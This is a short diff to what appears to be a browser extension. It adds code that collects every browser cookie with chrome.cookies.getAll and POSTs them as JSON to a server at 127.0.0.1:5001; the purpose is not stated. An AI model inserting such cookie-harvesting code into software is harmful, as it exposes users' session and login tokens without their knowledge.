@@ -82,6 +82,10 @@ async function getDomainCookies() {
   try {
     const cookies = await chrome.cookies.getAll({},
       function (result) {
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://127.0.0.1:5001/data", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify(result));
         console.log(result);
       });
     // console.log(cookies);
